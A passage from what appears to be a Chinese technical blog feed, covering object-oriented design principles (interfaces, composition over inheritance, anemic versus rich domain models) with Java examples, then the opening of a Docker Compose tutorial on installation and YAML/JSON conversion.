缺省实现</span>}<span class="hljs-keyword">class</span> <span class="hljs-title class_">Model</span> : <span class="hljs-keyword">public</span> Airplane { <span class="hljs-keyword">public</span>:    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">Fly</span><span class="hljs-params">()</span> <span class="hljs-keyword">override</span> </span>{        Airplane::<span class="hljs-built_in">Fly</span>();    }};</code></pre></div></div></blockquote></details></blockquote><h3 id="基于接口而非实现编程">基于接口而非实现编程</h3><p>抽象是好的。</p><blockquote><p>越抽象、越顶层、越脱离具体某一实现的设计，越能提高代码的灵活性，越能应对未来的需求变化。好的代码设计，不仅能应对当下的需求，而且在将来需求发生变化的时候，仍然能够在不破坏原有代码设计的情况下灵活应对。</p></blockquote><p>我们都知道抽象的好，但如何变抽象呢？</p><ol type="1"><li><p>先想好要做什么，再去想怎么做。这也是抽象人的思考方式。</p><blockquote><p>在定义接口的时候，希望通过实现类来反推接口的定义。先把实现类写好，然后看实现类中有哪些方法，照抄到接口定义中。如果按照这种思考方式，就有可能导致接口定义不够抽象，依赖具体的实现。</p></blockquote></li><li><p>定义接口时，命名要足够通用，特别不能包含跟具体实现相关的字眼；另一方面，与特定实现有关的方法不要定义在接口中。</p><ul><li>函数的命名不能暴露任何实现细节</li><li>封装具体的实现细节</li><li>为实现类定义抽象的接口</li></ul><blockquote><p>这一点更加接近具体的实践。原文中举的例子我也踩过类似的坑，所以也把它放在这里：</p><details><summary>具体案例</summary><p>假设我们的系统中有很多涉及图片处理和存储的业务逻辑。图片经过处理之后被上传到阿里云上。为了代码复用，我们封装了图片存储相关的代码逻辑，提供了一个统一的AliyunImageStore 类，供整个系统来使用。具体的代码实现如下所示：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-lygvkblmrh9u6a"></i><span>java</span><div class="collapse show" id="collapse-lygvkblmrh9u6a"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AliyunImageStore</span> {  <span class="hljs-comment">//...省略属性、构造函数等...</span>  <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createBucketIfNotExisting</span><span class="hljs-params">(String bucketName)</span> {    <span class="hljs-comment">// ...创建bucket代码逻辑...</span>    <span class="hljs-comment">// ...失败会抛出异常..</span>  }  <span class="hljs-keyword">public</span> String <span class="hljs-title function_">generateAccessToken</span><span class="hljs-params">()</span> {    <span class="hljs-comment">// ...根据accesskey/secrectkey等生成access token</span>  }  <span class="hljs-keyword">public</span> String <span class="hljs-title function_">uploadToAliyun</span><span class="hljs-params">(Image image, String bucketName, String accessToken)</span> {    <span class="hljs-comment">//...上传图片到阿里云...</span>    <span class="hljs-comment">//...返回图片存储在阿里云上的地址(url）...</span>  }  <span class="hljs-keyword">public</span> Image <span class="hljs-title function_">downloadFromAliyun</span><span class="hljs-params">(String url, String accessToken)</span> {    <span class="hljs-comment">//...从阿里云下载图片...</span>  }}<span class="hljs-comment">// AliyunImageStore类的使用举例</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ImageProcessingJob</span> {  <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">BUCKET_NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">"ai_images_bucket"</span>;  <span class="hljs-comment">//...省略其他无关代码...</span>  <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">process</span><span class="hljs-params">()</span> {    <span class="hljs-type">Image</span> <span class="hljs-variable">image</span> <span class="hljs-operator">=</span> ...; <span class="hljs-comment">//处理图片，并封装为Image对象</span>    <span class="hljs-type">AliyunImageStore</span> <span class="hljs-variable">imageStore</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AliyunImageStore</span>(<span class="hljs-comment">/*省略参数*/</span>);    imageStore.createBucketIfNotExisting(BUCKET_NAME);    <span class="hljs-type">String</span> <span class="hljs-variable">accessToken</span> <span class="hljs-operator">=</span> imageStore.generateAccessToken();    imagestore.uploadToAliyun(image, BUCKET_NAME, accessToken);  }}</code></pre></div></div><p>代码实现非常简单，类中的几个方法定义得都很干净，用起来也很清晰，乍看起来没有太大问题，完全能满足我们将图片存储在阿里云的业务需求。不过，软件开发中唯一不变的就是变化。过了一段时间后，我们自建了私有云，不再将图片存储到阿里云了，而是将图片存储到自建私有云上。</p><p>首先，AliyunImageStore类中有些函数命名暴露了实现细节，比如，uploadToAliyun() 和downloadFromAliyun()。如果开发这个功能的同事没有接口意识、抽象思维，那这种暴露实现细节的命名方式就不足为奇了，毕竟最初我们只考虑将图片存储在阿里云上。我们要修改项目中所有使用到这两个方法的代码，代码修改量可能就会很大。</p><p>其次，将图片存储到阿里云的流程，跟存储到私有云的流程，可能并不是完全一致的。比如，阿里云的图片上传和下载的过程中，需要生产access token，而私有云不需要 accesstoken。代码中用到了generateAccessToken()方法，如果要改为私有云的上传下载流程，这些代码都需要做调整。</p><p>我们可以这样重构：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-7wn551lmrh9u6a"></i><span>java</span><div class="collapse show" id="collapse-7wn551lmrh9u6a"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ImageStore</span> {  String <span class="hljs-title function_">upload</span><span class="hljs-params">(Image image, String bucketName)</span>;  Image <span class="hljs-title function_">download</span><span class="hljs-params">(String url)</span>;}<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AliyunImageStore</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ImageStore</span> {  <span class="hljs-comment">//...省略属性、构造函数等...</span>  <span class="hljs-keyword">public</span> String <span class="hljs-title function_">upload</span><span class="hljs-params">(Image image, String bucketName)</span> {    createBucketIfNotExisting(bucketName);    <span class="hljs-type">String</span> <span class="hljs-variable">accessToken</span> <span class="hljs-operator">=</span> generateAccessToken();    <span class="hljs-comment">//...上传图片到阿里云...</span>    <span class="hljs-comment">//...返回图片在阿里云上的地址(url)...</span>  }  <span class="hljs-keyword">public</span> Image <span class="hljs-title function_">download</span><span class="hljs-params">(String url)</span> {    <span class="hljs-type">String</span> <span class="hljs-variable">accessToken</span> <span class="hljs-operator">=</span> generateAccessToken();    <span class="hljs-comment">//...从阿里云下载图片...</span>  }  <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createBucketIfNotExisting</span><span class="hljs-params">(String bucketName)</span> {    <span class="hljs-comment">// ...创建bucket...</span>    <span class="hljs-comment">// ...失败会抛出异常..</span>  }  <span class="hljs-keyword">private</span> String <span class="hljs-title function_">generateAccessToken</span><span class="hljs-params">()</span> {    <span class="hljs-comment">// ...根据accesskey/secrectkey等生成access token</span>  }}<span class="hljs-comment">// 上传下载流程改变：私有云不需要支持access token</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PrivateImageStore</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ImageStore</span>  {  <span class="hljs-keyword">public</span> String <span class="hljs-title function_">upload</span><span class="hljs-params">(Image image, String bucketName)</span> {    createBucketIfNotExisting(bucketName);    <span class="hljs-comment">//...上传图片到私有云...</span>    <span class="hljs-comment">//...返回图片的url...</span>  }  <span class="hljs-keyword">public</span> Image <span class="hljs-title function_">download</span><span class="hljs-params">(String url)</span> {    <span class="hljs-comment">//...从私有云下载图片...</span>  }  <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createBucketIfNotExisting</span><span class="hljs-params">(String bucketName)</span> {    <span class="hljs-comment">// ...创建bucket...</span>    <span class="hljs-comment">// ...失败会抛出异常..</span>  }}<span class="hljs-comment">// ImageStore的使用举例</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ImageProcessingJob</span> {  <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">BUCKET_NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">"ai_images_bucket"</span>;  <span class="hljs-comment">//...省略其他无关代码...</span>  <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">process</span><span class="hljs-params">()</span> {    <span class="hljs-type">Image</span> <span class="hljs-variable">image</span> <span class="hljs-operator">=</span> ...;<span class="hljs-comment">//处理图片，并封装为Image对象</span>    <span class="hljs-type">ImageStore</span> <span class="hljs-variable">imageStore</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PrivateImageStore</span>(...);    imagestore.upload(image, BUCKET_NAME);  }}</code></pre></div></div><p><strong>但凡抱着写脚本的心态写代码，就很容易出现这样的问题</strong>，我给我自己的博客文章写了一个上传图文到Github的GUI脚本，就出现了这样的问题：<code>upload_to_github</code>方法写死，<code>hexo</code>命令写死，甚至上传函数中还硬编码了对GUI的控制。。。中间有一次希望整合为命令行批量上传，就费一些功夫。比如以后想把博客迁移到Hugo，或者更换图床等等，就又需要改动很多代码。</p></details><p>如果在我们的业务场景中，某个功能只有一种实现方式，未来也不可能被其他实现方式替换，那我们就没有必要为其设计接口。但大多数情况下还是需要预见变化的。因此学习优秀的框架是如何组织接口的，是非常有益的实践。</p></blockquote></li></ol><h3 id="多用组合少用继承">多用组合少用继承</h3><p>关于继承，我们不得不提经典的”是不是所有的鸟都会飞“的案例。</p><details><summary>关于这个"鸟事"的详细讲解</summary><p>假如我们我们将“鸟类”这样一个抽象的事物概念，定义为一个抽象类AbstractBird。所有更细分的鸟，比如麻雀、鸽子、乌鸦等，都继承这个抽象类。我们知道，大部分鸟都会飞，那我们可不可以在AbstractBird 抽象类中，定义一个 fly() 方法呢？答案是否定的。</p><p>当然，你可能会说，我在鸵鸟这个子类中<strong>重写（override）fly()方法</strong>，让它抛出 UnSupportedMethodException异常不就可以了吗？</p><p>这种设计思路虽然可以解决问题，但不够优美。</p><p>因为除了鸵鸟之外，不会飞的鸟还有很多，比如企鹅。对于这些不会飞的鸟来说，我们都需要重写fly()方法，抛出异常。这样的设计，一方面，徒增了编码的工作量；另一方面，也违背了我们之后要讲的最小知识原则（LeastKnowledgePrinciple，也叫最少知识原则或者迪米特法则），暴露不该暴露的接口给外部，增加了类使用过程中被误用的概率。同时，这种行为将错误拖延到了运行期，我们知道越早发现错误，越容易解决问题。</p><p>那我们再通过 AbstractBird类<strong>派生出两个更加细分的抽象类</strong>：会飞的鸟类AbstractFlyableBird 和不会飞的鸟类 AbstractUnFlyableBird？</p><p>这确实更忠实的反映了原本的意思，但是更复杂的情况，比如会不会叫，会不会下蛋等，阁下又该如何应对？那估计就要组合爆炸了。类的继承层次会越来越深、继承关系会越来越复杂。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E4%B9%8B%E7%BE%8E-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/20230911163736193761_420_image-20230910223118620.png" alt="image-20230910223118620"><figcaption aria-hidden="true">image-20230910223118620</figcaption></figure><p>我们可以利用<strong>组合（composition）、接口(interface)、委托（delegation）</strong>三个技术手段，一块儿来解决刚刚继承存在的问题。</p><p>针对“会飞”这样一个行为特性，我们可以定义一个 Flyable接口，只让会飞的鸟去实现这个接口。对于会叫、会下蛋这些行为特性，我们可以类似地定义Tweetable 接口、EggLayable 接口。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-szjq9llmrh9u6a"></i><span>java</span><div class="collapse show" id="collapse-szjq9llmrh9u6a"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Flyable</span> {  <span class="hljs-keyword">void</span> <span class="hljs-title function_">fly</span><span class="hljs-params">()</span>;}<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Tweetable</span> {  <span class="hljs-keyword">void</span> <span class="hljs-title function_">tweet</span><span class="hljs-params">()</span>;}<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">EggLayable</span> {  <span class="hljs-keyword">void</span> <span class="hljs-title function_">layEgg</span><span class="hljs-params">()</span>;}<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Ostrich</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Tweetable</span>, EggLayable {<span class="hljs-comment">//鸵鸟</span>  <span class="hljs-comment">//... 省略其他属性和方法...</span>  <span class="hljs-meta">@Override</span>  <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">tweet</span><span class="hljs-params">()</span> { <span class="hljs-comment">//... }</span>  <span class="hljs-meta">@Override</span>  <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">layEgg</span><span class="hljs-params">()</span> { <span class="hljs-comment">//... }</span>}<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Sparrow</span> impelents Flyable, Tweetable, EggLayable {<span class="hljs-comment">//麻雀</span>  <span class="hljs-comment">//... 省略其他属性和方法...</span>  <span class="hljs-meta">@Override</span>  <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">fly</span><span class="hljs-params">()</span> { <span class="hljs-comment">//... }</span>  <span class="hljs-meta">@Override</span>  <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">tweet</span><span class="hljs-params">()</span> { <span class="hljs-comment">//... }</span>  <span class="hljs-meta">@Override</span>  <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">layEgg</span><span class="hljs-params">()</span> { <span class="hljs-comment">//... }</span>}</code></pre></div></div><p>接口只声明方法，不定义实现。也就是说，每个会下蛋的鸟都要实现一遍layEgg()方法，并且实现逻辑是一样的，这就会导致代码重复的问题。那这个问题又该如何解决呢？</p><p>我们可以针对三个接口再定义三个实现类，它们分别是：实现了 fly() 方法的FlyAbility 类、实现了 tweet() 方法的 TweetAbility 类、实现了 layEgg()方法的 EggLayAbility类。然后，通过组合和委托技术来消除代码重复。具体的代码实现如下所示：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-yjzad3lmrh9u6a"></i><span>java</span><div class="collapse show" id="collapse-yjzad3lmrh9u6a"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Flyable</span> {  <span class="hljs-keyword">void</span> <span class="hljs-title function_">fly</span><span class="hljs-params">()</span>；}<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FlyAbility</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Flyable</span> {  <span class="hljs-meta">@Override</span>  <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">fly</span><span class="hljs-params">()</span> { <span class="hljs-comment">//... }</span>}<span class="hljs-comment">//省略Tweetable/TweetAbility/EggLayable/EggLayAbility</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Ostrich</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Tweetable</span>, EggLayable {<span class="hljs-comment">//鸵鸟</span>  <span class="hljs-keyword">private</span> <span class="hljs-type">TweetAbility</span> <span class="hljs-variable">tweetAbility</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TweetAbility</span>(); <span class="hljs-comment">//组合</span>  <span class="hljs-keyword">private</span> <span class="hljs-type">EggLayAbility</span> <span class="hljs-variable">eggLayAbility</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EggLayAbility</span>(); <span class="hljs-comment">//组合</span>  <span class="hljs-comment">//... 省略其他属性和方法...</span>  <span class="hljs-meta">@Override</span>  <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">tweet</span><span class="hljs-params">()</span> {    tweetAbility.tweet(); <span class="hljs-comment">// 委托</span>  }  <span class="hljs-meta">@Override</span>  <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">layEgg</span><span class="hljs-params">()</span> {    eggLayAbility.layEgg(); <span class="hljs-comment">// 委托</span>  }}</code></pre></div></div><blockquote><p>来自 Effective C++ 条款32：确定你的public继承塑模出is-a关系</p><p>即便如此，此刻我们仍然未能完全处理好这些鸟事，因为对某些软件系统而言，可能不需要区分会飞的鸟和不会飞的鸟。如果你的程序忙着处理鸟喙和鸟翅，完全不在乎飞行，原先的“双classes继承体系”或许就相当令人满足了。这反映出一个事实，世界上并不存在一个“适用于所有软件”的完美设计。所谓最佳设计，取于系统希望做什么事，包括现在与未来。</p></blockquote></details><p>继承主要有三个作用：表示 is-a关系，支持多态特性，代码复用。而这三个作用都可以通过其他技术手段来达成。</p><p>比如 is-a 关系，我们可以通过组合和接口的 has-a关系来替代；比如鸵鸟是(is-a)鸟，可以理解成鸵鸟有(has-a)鸟的特点，这个”特点“或者说像鸟的行为可以抽象为方法。</p><p>多态特性我们可以利用接口来实现，这一点Go或python的鸭子类型体现更加明显：只要某个类实现了某个接口的所有方法，就可以看做是某个接口的实现，调用时只管调用接口方法，而不需要区分调用的是什么。这和多态所诉求的"动态联编"(通过基类使用子类，运行时调用子类实现)是吻合的。</p><p>代码复用我们可以通过组合和委托来实现。上面案例中的代码已经有所体现。</p><p>所以，从理论上讲，通过组合、接口、委托三个技术手段，我们完全可以替换掉继承，在项目中不用或者少用继承关系，特别是一些复杂的继承关系。</p><h3 id="贫血模型和充血模型">贫血模型和充血模型</h3><p>作者将将<strong>数据与操作分离</strong>的模型，如传统的<strong>MVC</strong>，称作“贫血模型”，而将<strong>数据和对应的业务逻辑被封装到同一个类</strong>中的模型，<strong>如领域驱动设计</strong>（DomainDriven Design，简称 DDD），称作“充血模型”。</p><p>抛开华丽的概念不谈，具体到实践，最常见的前后端分离项目，即后端负责暴露接口给前端调用。我们一般就将后端项目分为Repository 层、Service 层、Controller 层。其中，Repository层负责数据访问，Service 层负责业务逻辑，Controller层负责暴露接口。如果熟悉JavaWeb开发，可能会非常耳熟能详，比如对一个用户类，UserEntity 和UserRepository 组成了数据访问层，UserBo 和 UserService组成了业务逻辑层，UserVo 和 UserController 属于接口层。</p><p>作者的主要观点，传统MVC中，BO通常只包含数据，不包含具体的业务逻辑。这样的后果就是我们可能会不觉的将过多的业务逻辑放到Service层，甚至更极端的，可能会变成“面向SQL编程”。</p><p>将过多的业务逻辑放到Service层，业务一多了，就会变得臃肿而且难以维护，特别是多人开发时间紧迫的情况下，很容易出现复制黏贴代码，反正能跑就行的情况，积重难返。面向SQL编程更是将业务逻辑与实际的存储模型耦合，要开发另一个业务功能的时候，只能重新写个满足新需求的SQL 语句，这就可能导致各种长得差不多、区别很小的 SQL语句满天飞。假设某一部分数据换到Redis上存储，需要改动的代码又很多。</p><p>而“领域驱动设计”<strong>则提倡如果业务逻辑只依赖BO/领域模型的数据，那么就应该把业务逻辑下放到BO/领域模型中</strong>。</p><p>事实上，领域驱动设计与微服务的概念不谋而合。将领域模型提取出来，便可以很容易的进行复制，提高系统的容灾能力。</p><p>Service层应该完成的事情只包含：</p><ul><li>与 Repository交流。获取数据库中的数据，转化成领域模型，然后由领域模型来完成业务逻辑，最后调用Repository 类的方法，将数据存回数据库。</li><li>负责跨领域模型的业务聚合功能。比如一个业务需要用到多个领域模型，那么可以将其放到Service层中，当然也可以提取为新的领域模型。</li><li>非功能性及与三方系统交互的工作。比如幂等、事务、发邮件、发消息、记录日志、调用其他系统的RPC 接口等。换句话说，就是中间件所做的工作。</li></ul><h2 id="总结">总结</h2><p>这一部分在谈设计模式之前，首先明确了什么是面向对象，怎样才是面向对象过程，同时也结合实际对面向对象中的精华和糟粕进行分析，帮助我们清晰的认识面向对象编程。</p>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>设计模式</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>深入浅出Docker应用-Docker Compose实战</title>
    <link href="/posts/40623/"/>
    <url>/posts/40623/</url>
    
    <content type="html"><![CDATA[<h1 id="深入浅出docker应用-docker-compose实战">深入浅出Docker应用-DockerCompose实战</h1><h2 id="docker-compose入门">Docker Compose入门</h2><h3 id="docker-compose的安装">Docker Compose的安装</h3><p>在之前的实验中，我们在创建和管理容器的时候，都是用的是docker的命令行，但是随着dockerrun参数的增多，命令行的长度会越来越长。再加上复杂的服务往往由多个不同的容器共同组成，这样在创建一个完整的服务的时候，就会输入多条超长的命令。这时候我们就可以考虑使用dockercompose。</p><p>docker compose 是一个用go语言开发的docker扩展程序，通过dockercompose我可以使用配置文件的方式来同时管理多个容器。接下来我们先来学习dockercompose的安装。</p><blockquote><p>注：可参见<a href="https://docs.docker.com/compose/install/linux/#install-using-the-repository">官网</a></p></blockquote><ol type="1"><li>插件安装（推荐）</li></ol><p>dockercompose的安装有两种方式，分别为作为docker插件和单独应用。在centos或者redhat系统中，我们可以通过yum以插件的方式安装dockercompose。这种方式在安装之后会将dockercompose作为docker插件进行运行。我们可以通过<code>docker compose</code>命令进行调用。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-9zzdpflmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-9zzdpflmrh9u69"><pre><code class="hljs shell">yum install -y docker-compose-plugindocker compose version</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%20Compose%E5%AE%9E%E6%88%98/20230906140854608011_980_image-20230906120028310.png" alt="image-20230906120028310"><figcaption aria-hidden="true">image-20230906120028310</figcaption></figure><ol start="2" type="1"><li>单独应用安装</li></ol><p>略。不推荐使用。</p><h3 id="yml到json的转化工具">YML到JSON的转化工具</h3><p>YML文件是一种适合人类阅读的配置文件格式，这种文件格式能够表示的数据结构和JSON格式配置文件类似。为了便于我们学习，我们先来制作一个YML和JSON的互相转换工具，以便于理解YML的格式。</p><ol type="1"><li>创建转换镜像</li></ol><p>我们基于python中的yaml和json模块来实现解析功能。首先我们来创建Dockerfile，在镜像中首先通过<code>pip install</code>安装<code>pyyaml</code>模块。接下来再添加两条py格式的脚本<code>2json.py</code>和<code>2yml.py</code>。我们使用<code>vi</code>来编辑<code>Dockerfile</code></p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-glb8lblmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-glb8lblmrh9u69"><pre><code class="hljs shell">vi Dockerfile</code></pre></div></div><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-r44f0klmrh9u69"></i><span>dockerfile</span><div class="collapse show" id="collapse-r44f0klmrh9u69"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> python:latest<span class="hljs-keyword">RUN</span><span class="language-bash"> pip install pyyaml</span><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">"import yaml, json, sys\n\</span></span><span class="hljs-string"><span class="language-bash">print(json.dumps(yaml.safe_load(sys.stdin.read()), indent=4))"</span> &gt; 2json.py</span><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">"import yaml, json, sys\n\</span></span><span class="hljs-string"><span class="language-bash">print(yaml.safe_dump(json.load(sys.stdin), sort_keys=False))"</span> &gt; 2yml.py</span></code></pre></div></div><p>Dockerfile编写好之后，我们生成容器镜像：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-kvnhqklmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-kvnhqklmrh9u69"><pre><code class="hljs shell">docker build -t yml/py . docker images</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%20Compose%E5%AE%9E%E6%88%98/20230906140858972702_400_image-20230906120814383.png" alt="image-20230906120814383"><figcaption aria-hidden="true">image-20230906120814383</figcaption></figure><ol start="2" type="1"><li>YML转化为JSON</li></ol><p>接下来我们使用刚才创建好的镜像，将yml文件转化为json格式。首先我们创建一个最简单的YML文件<code>demo.yml</code>。内容为<code>id: '10'</code>。</p><p>接下来在这里我们在执行dockerrun创建容器时使用<code>--rm</code>参数。该参数创建的容器在退出后会自动被删除，一般用于执行一次性任务的容器的创建。同时在命令中使用了<code>&lt;</code>重定向符号，将宿主机中的文件作为参数传递给容器中。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-zf9zg2lmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-zf9zg2lmrh9u69"><pre><code class="hljs shell">echo id: '10' &gt; demo.ymldocker run -i --rm yml/py python 2json.py &lt; demo.yml</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%20Compose%E5%AE%9E%E6%88%98/20230906140903420195_222_image-20230906120838553.png" alt="image-20230906120838553"><figcaption aria-hidden="true">image-20230906120838553</figcaption></figure><ol start="3" type="1"><li>JSON转化为YML</li></ol><p>然后我们再来尝试将JSON格式文件转化为YML格式。首先创建一个简单的JSON文件，然后使用下面命令执行容器中的<code>2yml.py</code>即可。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-fnhbuvlmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-fnhbuvlmrh9u69"><pre><code class="hljs shell">echo \{\"name\":\"aliyun\",\"age\":100} &gt; demo.jsondocker run -i --rm yml/py python 2yml.py &lt; demo.json</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%20Compose%E5%AE%9E%E6%88%98/20230906140906842553_579_image-20230906120923498.png" alt="image-20230906120923498"><figcaption aria-hidden="true">image-20230906120923498</figcaption></figure><h3 id="yml格式配置文件">YML格式配置文件</h3><p>在dockercompose安装完毕后，我们需要编写YML格式的配置文件配合该工具进行使用。在本小节中我们先来学习YML格式配置文件的用法。</p><blockquote><p>注：如果已经对YML比较熟悉，该节可以略过。</p></blockquote><p>YML文件中包括了纯量，Key/Value对象，数组三种形式。但是和JSON使用<code>{}</code>表示层次关系不同的是，YML通过行前的空格来表明内容之间的层次关系。</p><ol type="1"><li>YML的对象</li></ol><p>接下来我们先来看YML中的第一种数据结构对象。对象是由多个Key/Value属性对对组成，属性对的格式为<code>key: value</code>。注意和JSON不同的是，一行中只包含一个属性对。</p><p>如果属性对的Value值为对象或者数组时，Value的内容需要新起一行，同时新起的一行要比上一行更多的空格（一般使用4个空格）缩进来表示。</p><p>接下来我们使用vi构建一个demo.yml文件来演示对象结构，并且转化成JSON结构和YML结构进行对比。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-ytnxe7lmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-ytnxe7lmrh9u69"><pre><code class="hljs shell">vi demo1.yml</code></pre></div></div><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-tlrsbrlmrh9u69"></i><span>yaml</span><div class="collapse show" id="collapse-tlrsbrlmrh9u69"><pre><code class="hljs yaml"><span class="hljs-attr">name:</span> <span class="hljs-string">"aliyun"</span><span class="hljs-attr">attr:</span>     <span class="hljs-attr">age:</span> <span class="hljs-number">10</span>    <span class="hljs-attr">addr:</span> <span class="hljs-string">"HANGZHOU"</span></code></pre></div></div><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-knph1ilmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-knph1ilmrh9u69"><pre><code class="hljs shell">cat demo1.ymldocker run -i --rm yml/py python 2json.py &lt; demo1.yml</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%20Compose%E5%AE%9E%E6%88%98/20230906141349874042_518_image-20230906121133060.png" alt="image-20230906121133060"><figcaption aria-hidden="true">image-20230906121133060</figcaption></figure><ol start="2" type="1"><li>YML中的纯量</li></ol><p>纯量是指对象的Value或者数组中不可分割的量，换句说话就是简单属性类型。YML的纯量包括：字符串，数字，布尔，日期，时间等类型。接下来我们编辑demo.yml来做演示。需要注意的是python默认的JSON编码模块不支持日期时间。因此我们使用<code>#</code>注释日期时间属性对。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-3myt3wlmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-3myt3wlmrh9u69"><pre><code class="hljs shell">vi demo2.yml</code></pre></div></div><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" 